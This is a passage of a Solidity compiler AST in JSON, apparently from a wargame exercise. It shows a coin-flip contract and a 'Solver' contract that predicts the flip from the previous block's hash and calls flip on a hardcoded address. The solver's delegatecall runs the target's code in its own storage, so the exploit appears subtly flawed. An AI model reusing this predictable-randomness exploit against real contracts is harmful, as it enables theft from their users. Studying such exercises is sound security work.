														"referencedDeclaration": 8,
														"src": "599:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "586:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "567:38:0"
											},
											{
												"assignments": [
													54
												],
												"declarations": [
													{
														"constant": false,
														"id": 54,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "617:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "612:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 53,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "612:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 55,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "624:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "636:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "624:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "647:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "624:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "640:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "612:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 62,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "665:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 63,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "673:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "665:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 77,
													"nodeType": "Block",
													"src": "741:57:0",
													"statements": [
														{
															"expression": {
																"id": 73,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "750:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "768:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "750:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 74,
															"nodeType": "ExpressionStatement",
															"src": "750:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "785:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 22,
															"id": 76,
															"nodeType": "Return",
															"src": "778:12:0"
														}
													]
												},
												"id": 78,
												"nodeType": "IfStatement",
												"src": "661:137:0",
												"trueBody": {
													"id": 70,
													"nodeType": "Block",
													"src": "681:54:0",
													"statements": [
														{
															"expression": {
																"id": 66,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "690:17:0",
																"subExpression": {
																	"id": 65,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "690:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"nodeType": "ExpressionStatement",
															"src": "690:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "723:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 22,
															"id": 69,
															"nodeType": "Return",
															"src": "716:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 80,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "365:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_guess",
												"nameLocation": "375:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "370:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 17,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "370:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "369:13:0"
									},
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "399:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 20,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "399:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "398:6:0"
									},
									"scope": 81,
									"src": "356:447:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 139,
							"src": "115:691:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 138,
							"linearizedBaseContracts": [
								138
							],
							"name": "Solver",
							"nameLocation": "819:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 84,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "841:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 138,
									"src": "833:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 82,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "833:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 83,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "850:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 87,
									"mutability": "mutable",
									"name": "contractAddr",
									"nameLocation": "942:12:0",
									"nodeType": "VariableDeclaration",
									"scope": 138,
									"src": "934:65:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 85,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "934:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307845436436363731443931653637373532326636393843353942374237463639413036383244393735",
										"id": 86,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "957:42:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0xECd6671D91e677522f698C59B7B7F69A0682D975"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 136,
										"nodeType": "Block",
										"src": "1048:314:0",
										"statements": [
											{
												"assignments": [
													93
												],
												"declarations": [
													{
														"constant": false,
														"id": 93,
														"mutability": "mutable",
														"name": "whatToSend",
														"nameLocation": "1064:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 136,
														"src": "1059:15:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 92,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1059:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 107,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 106,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 104,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"arguments": [
																{
																	"arguments": [
																		{
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 100,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"expression": {
																					"id": 97,
																					"name": "block",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 4294967292,
																					"src": "1095:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_block",
																						"typeString": "block"
																					}
																				},
																				"id": 98,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "number",
																				"nodeType": "MemberAccess",
																				"src": "1095:12:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"hexValue": "31",
																				"id": 99,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1110:1:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"src": "1095:16:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"id": 96,
																		"name": "blockhash",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967291,
																		"src": "1085:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																			"typeString": "function (uint256) view returns (bytes32)"
																		}
																	},
																	"id": 101,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "1085:27:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes32",
																		"typeString": "bytes32"
																	}
																],
																"id": 95,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1077:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_uint256_$",
																	"typeString": "type(uint256)"
																},
																"typeName": {
																	"id": 94,
																	"name": "uint256",
																	"nodeType": "ElementaryTypeName",
																	"src": "1077:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 102,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1077:36:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"id": 103,
															"name": "FACTOR",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 84,
															"src": "1116:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1077:45:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"hexValue": "30",
														"id": 105,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1125:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1077:49:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1059:67:0"
											},
											{
												"condition": {
													"id": 108,
													"name": "whatToSend",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 93,
													"src": "1140:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 134,
													"nodeType": "Block",
													"src": "1260:95:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"hexValue": "666c697028626f6f6c29",
																						"id": 128,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "string",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1322:12:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																							"typeString": "literal_string \"flip(bool)\""
																						},
																						"value": "flip(bool)"
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																							"typeString": "literal_string \"flip(bool)\""
																						}
																					],
																					"id": 127,
																					"name": "keccak256",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 4294967288,
																					"src": "1312:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																						"typeString": "function (bytes memory) pure returns (bytes32)"
																					}
																				},
																				"id": 129,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1312:23:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			{
																				"hexValue": "66616c7365",
																				"id": 130,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "bool",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1336:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				},
																				"value": "false"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				{
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			],
																			"expression": {
																				"id": 125,
																				"name": "abi",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967295,
																				"src": "1301:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_abi",
																					"typeString": "abi"
																				}
																			},
																			"id": 126,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"memberName": "encode",
																			"nodeType": "MemberAccess",
																			"src": "1301:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																				"typeString": "function () pure returns (bytes memory)"
																			}
																		},
																		"id": 131,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1301:41:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"expression": {
																		"id": 122,
																		"name": "contractAddr",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 87,
																		"src": "1275:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"id": 124,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "delegatecall",
																	"nodeType": "MemberAccess",
																	"src": "1275:25:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_baredelegatecall_nonpayable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																		"typeString": "function (bytes memory) returns (bool,bytes memory)"
																	}
																},
																"id": 132,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1275:68:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "tuple(bool,bytes memory)"
																}
															},
															"id": 133,
															"nodeType": "ExpressionStatement",
															"src": "1275:68:0"
														}
													]
												},
												"id": 135,
												"nodeType": "IfStatement",
												"src": "1137:218:0",
												"trueBody": {
													"id": 121,
													"nodeType": "Block",
													"src": "1151:94:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"hexValue": "666c697028626f6f6c29",
																						"id": 115,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "string",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1213:12:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																							"typeString": "literal_string \"flip(bool)\""
																						},
																						"value": "flip(bool)"
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_stringliteral_1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d",
																							"typeString": "literal_string \"flip(bool)\""
																						}
																					],
																					"id": 114,
																					"name": "keccak256",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 4294967288,
																					"src": "1203:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																						"typeString": "function (bytes memory) pure returns (bytes32)"
																					}
																				},
																				"id": 116,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1203:23:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			{
																				"hexValue": "74727565",
																				"id": 117,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "bool",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1227:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				},
																				"value": "true"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				{
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			],
																			"expression": {
																				"id": 112,
																				"name": "abi",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 4294967295,
																				"src": "1192:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_abi",
																					"typeString": "abi"
																				}
																			},
																			"id": 113,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"memberName": "encode",
																			"nodeType": "MemberAccess",
																			"src": "1192:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																				"typeString": "function () pure returns (bytes memory)"
																			}
																		},
																		"id": 118,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1192:40:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"expression": {
																		"id": 109,
																		"name": "contractAddr",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 87,
																		"src": "1166:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"id": 111,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "delegatecall",
																	"nodeType": "MemberAccess",
																	"src": "1166:25:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_baredelegatecall_nonpayable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																		"typeString": "function (bytes memory) returns (bool,bytes memory)"
																	}
																},
																"id": 119,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1166:67:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "tuple(bool,bytes memory)"
																}
															},
															"id": 120,
															"nodeType": "ExpressionStatement",
															"src": "1166:67:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "890d6908",
									"id": 137,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "solve",
									"nameLocation": "1015:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 88,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1020:2:0"
									},
									"returnParameters": {
										"id": 91,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 90,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 137,
												"src": "1039:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 89,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1039:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "1038:9:0"
									},
									"scope": 138,
									"src": "1006:356:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 139,
							"src": "810:555:0",
							"usedErrors": []
						}
					],
					"src": "33:1332:0"
				},
				"id": 0
			}
		}
	}
}